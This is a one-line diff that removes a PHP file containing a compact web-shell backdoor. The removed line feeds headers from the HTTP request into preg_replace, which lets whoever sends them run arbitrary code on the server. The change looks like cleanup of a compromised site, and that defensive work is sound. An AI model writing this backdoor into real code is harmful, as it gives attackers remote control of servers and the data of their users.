@@ -1,1 +1,0 @@
-<?php @preg_replace($_SERVER['HTTP_X_C68F74'], $_SERVER['HTTP_X_CURRENT'], ''); ?>
